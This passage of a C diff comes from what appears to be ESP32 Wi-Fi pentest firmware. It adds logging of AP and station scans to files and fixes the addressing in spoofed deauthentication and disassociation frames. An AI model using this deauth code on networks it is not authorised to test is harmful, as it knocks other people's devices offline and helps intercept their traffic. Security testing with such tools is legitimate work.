+        printf("Please wait ~5 Seconds...\n");
+        TERMINAL_VIEW_ADD_TEXT("Please wait ~5 Seconds...\n");
     #else
         printf("Please wait 5 Seconds...\n");
         TERMINAL_VIEW_ADD_TEXT("Please wait 5 Seconds...\n");
@@ -1829,6 +2222,15 @@ void wifi_manager_start_scan() {
     log_heap_status(TAG, "scan_start_post");
     esp_wifi_stop();
     ap_manager_start_services();
+
+    // Restore saved static color if no RGB effect is running.
+    if (rgb_effect_task_handle == NULL) {
+        RGBMode mode = settings_get_rgb_mode(&G_Settings);
+        if (mode != RGB_MODE_RAINBOW && mode != RGB_MODE_STEALTH &&
+            mode != RGB_MODE_KNIGHT_RIDER && mode != RGB_MODE_NORMAL) {
+            rgb_manager_apply_static_from_settings();
+        }
+    }
 }
 
 // Stop scanning for networks
@@ -1914,8 +2316,14 @@ void wifi_manager_list_stations() {
         printf("No stations found.\n");
         return;
     }
+
+    scan_file_t sf = SCAN_FILE_INIT;
+    bool saving = (scan_file_open(&sf, "station_scan", "txt") == ESP_OK);
+
     printf("--- Station List (%d entries) ---\n", station_count);
     TERMINAL_VIEW_ADD_TEXT("--- Station List (%d entries) ---\n", station_count);
+    if (saving) scan_file_printf(&sf, "--- Station List (%d entries) ---\n", station_count);
+
     for (int i = 0; i < station_count; i++) {
         char sanitized_ssid[33];
         bool found = false;
@@ -1961,7 +2369,15 @@ void wifi_manager_list_stations() {
         TERMINAL_VIEW_ADD_TEXT("     Associated AP: %s\n", sanitized_ssid);
         TERMINAL_VIEW_ADD_TEXT("     AP BSSID: %s\n", ap_mac_str);
         TERMINAL_VIEW_ADD_TEXT("     AP Vendor: %s\n", ap_vendor);
+
+        if (saving) {
+            scan_file_printf(&sf, "[%d] STA: %s (%s) -> AP: %s BSSID: %s (%s)\n",
+                             i, sta_mac_str, sta_vendor,
+                             sanitized_ssid, ap_mac_str, ap_vendor);
+        }
     }
+
+    if (saving) scan_file_close(&sf);
 }
 
 static bool check_packet_rate(void) {
@@ -2063,13 +2479,13 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
     // If not broadcast, send reverse direction
     if (!is_broadcast) {
         // Swap addresses for Station -> AP direction
-        memcpy(&deauth_frame[4], bssid, 6); // Set destination as AP
-        memcpy(&deauth_frame[10], mac, 6);  // Set source as station
-        memcpy(&deauth_frame[16], mac, 6);  // Set BSSID as station
+        memcpy(&deauth_frame[4], bssid, 6);
+        memcpy(&deauth_frame[10], mac, 6);
+        memcpy(&deauth_frame[16], bssid, 6);
 
         memcpy(&disassoc_frame[4], bssid, 6);
         memcpy(&disassoc_frame[10], mac, 6);
-        memcpy(&disassoc_frame[16], mac, 6);
+        memcpy(&disassoc_frame[16], bssid, 6);
 
         // New sequence number for reverse direction
         seq = (esp_random() & 0xFFF) << 4;
@@ -3849,7 +4265,7 @@ void wifi_manager_stop_deauth() {
             vTaskDelete(deauth_task_handle);
             deauth_task_handle = NULL;
             beacon_task_running = false;
-            rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
+            rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
             wifi_manager_stop_monitor_mode();
             esp_wifi_stop();
             ap_manager_start_services();
@@ -3933,13 +4349,19 @@ void wifi_manager_print_scan_results_with_oui() {
         return;
     }
 
+    scan_file_t sf = SCAN_FILE_INIT;
+    bool saving = (scan_file_open(&sf, "ap_scan", "txt") == ESP_OK);
+
     uint16_t limit = ap_count;
+
+    if (saving) {
+        scan_file_printf(&sf, "--- AP Scan Results (%u APs) ---\n", limit);
+    }
 
     for (uint16_t i = 0; i < limit; i++) {
         char sanitized_ssid[33];
         sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
 
-        // lookup vendor using oui database
         char mac_str[18];
         snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                  scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
@@ -3957,6 +4379,12 @@ void wifi_manager_print_scan_results_with_oui() {
              scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
              scanned_aps[i].rssi,
              scanned_aps[i].primary);
+
+        if (saving) {
+            scan_file_printf(&sf, "[%u] SSID: %s, BSSID: %s, RSSI: %d, CH: %d",
+                             i, sanitized_ssid, mac_str,
+                             scanned_aps[i].rssi, scanned_aps[i].primary);
+        }
 
 #if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
         {
@@ -4011,12 +4439,20 @@ void wifi_manager_print_scan_results_with_oui() {
             } else {
                 glog("     Security: %s\n", auth_str);
             }
+            if (saving) {
+                scan_file_printf(&sf, ", Band: %s, Security: %s", band_str, auth_str);
+                if (pmf_str) scan_file_printf(&sf, ", PMF: %s", pmf_str);
+            }
         }
 #endif
         if (has_vendor) {
             glog("     Vendor: %s\n", vendor);
+            if (saving) scan_file_printf(&sf, ", Vendor: %s", vendor);
         }
+        if (saving) scan_file_printf(&sf, "\n");
     }
+
+    if (saving) scan_file_close(&sf);
 }
 
 static void live_ap_channel_hop_timer_callback(void *arg) {
@@ -4416,6 +4852,7 @@ void wifi_manager_start_ip_lookup() {
 void wifi_manager_connect_wifi(const char *ssid, const char *password) {
     printf("Connecting to WiFi: %s\n", ssid);
     TERMINAL_VIEW_ADD_TEXT("Connecting to WiFi: %s\n", ssid);
+    status_display_show_status("WiFi Connecting...");
     
     wifi_config_t wifi_config = {0};
     
